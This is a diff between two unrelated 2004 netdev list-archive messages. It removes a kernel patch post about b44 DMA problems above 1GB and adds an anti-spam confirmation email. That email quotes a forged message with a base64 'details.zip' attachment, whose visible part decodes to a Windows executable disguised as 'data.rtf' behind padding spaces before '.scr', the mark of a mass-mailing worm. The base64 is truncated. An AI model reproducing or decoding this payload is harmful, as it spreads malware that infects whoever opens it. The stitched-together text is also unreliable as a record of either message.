@@ -1,122 +1,166 @@
-From: Pekka Pietikainen <pp@ee.oulu.fi>
-Subject: b44 and 4g4g
-Date: Mon, 31 May 2004 23:21:04 +0300
+From: "qconfirm" <webmaster-qconfirm-ddfaa155141b682ab501e4a5dcd6855f@tenberry.com>
+Subject: Please confirm your message
+Date: 31 May 2004 11:22:11 -0000
 Sender: netdev-bounce@oss.sgi.com
-Message-ID: <20040531202104.GA8301@ee.oulu.fi>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=iso-8859-1
+Message-ID: <20040531112211.6787.qmail@tenberry.com>
 Return-path: <netdev-bounce@oss.sgi.com>
 To: netdev@oss.sgi.com
-Content-Disposition: inline
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
-After diagnosing 
-https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=118165
-for a while
+Hello, this is the Tenberry anti-SPAM program (qconfirm).
+Because of the volume of SPAM sent to 'webmaster@tenberry.com',
+we have decided to require confirmation that incoming
+message(s) are legitimate and not junk-mail.
 
-it seems that bcm4401 is quite broken when DMA:ing from/to
-addresses that are > 1GB. This only is a problem with > 1GB of physical
-memory and when using a 4:4 split.
+One or more messages to 'webmaster@tenberry.com' from you
+are being held because your address is not yet recorded
+as valid.
 
-It appears the network core code doesn't have a way of dealing with 
-this situation cleanly, Arjan found this:
+To release your pending message(s) for delivery, and to
+insure that any future messages from you are not held up,
+please reply to this email.  Your reply will not be read,
+so an empty message is fine.  So is hitting the 'reply'
+and then 'send' buttons in your email client.
 
-static inline int illegal_highdma(struct net_device *dev, struct sk_buff
-*skb)
-{
-        int i;
- 
-        if (dev->features & NETIF_F_HIGHDMA)
-                return 0;
- 
-        for (i = 0; i < skb_shinfo(skb)->nr_frags; i++)
-                if (skb_shinfo(skb)->frags[i].page >= highmem_start_page)
-                        return 1;
- 
-        return 0;
-}
+If you do not reply to this email, your message(s) will
+eventually be returned to you, and will never be
+delivered to 'webmaster@tenberry.com'.
 
-which doesn't take the pci dma mask into account at all, which it probably
-should.
+Regards, the Tenberry anti-SPAM program.
 
-(Please correct me if I got details wrong, this is a bit over my head :-) )
 
-Now, close your eyes and imagine you never saw this patch (which
-does go a bit overkill with the GFP_DMA's just-in-case), which 
-demonstrates what's required to make even receives work :-(
-(trying to transmit causes the chip to do a link down/link up thing after a
-few packets, which would suggest it gets very confused).
+--- Below this line is the top of a message from you.
 
---- ../linux-2.6.6-1.391/net/core/dev.c	2004-05-26 15:29:13.000000000 +0300
-+++ net/core/dev.c	2004-05-31 20:05:45.000000000 +0300
-@@ -1197,7 +1197,7 @@
- 	skb->ip_summed = CHECKSUM_NONE;
- 	return skb;
- }
--
-+#if 0
- #ifdef CONFIG_HIGHMEM
- /* Actually, we should eliminate this check as soon as we know, that:
-  * 1. IOMMU is present and allows to map all the memory.
-@@ -1220,7 +1220,8 @@
- #else
- #define illegal_highdma(dev, skb)	(0)
- #endif
--
-+#endif
-+#define illegal_highdma(dev, skb)	(1)
- extern void skb_release_data(struct sk_buff *);
- 
- /* Keep head the same: replace data */
---- ../linux-2.6.6-1.391/drivers/net/b44.c	2004-05-26 15:29:11.000000000 +0300
-+++ drivers/net/b44.c	2004-05-31 22:38:20.249808096 +0300
-@@ -634,7 +634,7 @@
- 		src_map = &bp->rx_buffers[src_idx];
- 	dest_idx = dest_idx_unmasked & (B44_RX_RING_SIZE - 1);
- 	map = &bp->rx_buffers[dest_idx];
--	skb = dev_alloc_skb(RX_PKT_BUF_SZ);
-+	skb = __dev_alloc_skb(RX_PKT_BUF_SZ,GFP_DMA);
- 	if (skb == NULL)
- 		return -ENOMEM;
- 
-@@ -762,7 +762,7 @@
- 			struct sk_buff *copy_skb;
- 
- 			b44_recycle_rx(bp, cons, bp->rx_prod);
--			copy_skb = dev_alloc_skb(len + 2);
-+			copy_skb = __dev_alloc_skb(len + 2,GFP_DMA);
- 			if (copy_skb == NULL)
- 				goto drop_it_no_recycle;
- 
-@@ -1077,13 +1077,13 @@
- 	int size;
- 
- 	size  = B44_RX_RING_SIZE * sizeof(struct ring_info);
--	bp->rx_buffers = kmalloc(size, GFP_KERNEL);
-+	bp->rx_buffers = kmalloc(size, GFP_DMA|GFP_KERNEL);
- 	if (!bp->rx_buffers)
- 		goto out_err;
- 	memset(bp->rx_buffers, 0, size);
- 
- 	size = B44_TX_RING_SIZE * sizeof(struct ring_info);
--	bp->tx_buffers = kmalloc(size, GFP_KERNEL);
-+	bp->tx_buffers = kmalloc(size, GFP_DMA|GFP_KERNEL);
- 	if (!bp->tx_buffers)
- 		goto out_err;
- 	memset(bp->tx_buffers, 0, size);
-@@ -1727,7 +1727,13 @@
- 
- 	pci_set_master(pdev);
- 
--	err = pci_set_dma_mask(pdev, (u64) 0xffffffff);
-+	err = pci_set_dma_mask(pdev, (u64) 0x3fffffff);
-+	if (err) {
-+		printk(KERN_ERR PFX "No usable DMA configuration, "
-+		       "aborting.\n");
-+		goto err_out_free_res;
-+	}
-+	err = pci_set_consistent_dma_mask(pdev, (u64) 0x3fffffff);
- 	if (err) {
- 		printk(KERN_ERR PFX "No usable DMA configuration, "
- 		       "aborting.\n");
+Received: (qmail 6776 invoked from network); 31 May 2004 11:22:08 -0000
+Received: from unknown (HELO tenberry.com) (61.95.203.76)
+  by tenberry.com with SMTP; 31 May 2004 11:22:08 -0000
+From: netdev@oss.sgi.com
+To: webmaster@tenberry.com
+Subject: 
+Date: Mon, 31 May 2004 16:49:31 +0530
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0016----=_NextPart_000_0016"
+X-Priority: 3
+X-MSMail-Priority: Normal
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0016----=_NextPart_000_0016
+Content-Type: text/plain;
+	charset="Windows-1252"
+Content-Transfer-Encoding: 7bit
+
+
+
+
+------=_NextPart_000_0016----=_NextPart_000_0016
+Content-Type: application/octet-stream;
+	name="details.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="details.zip"
+
+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
+YI
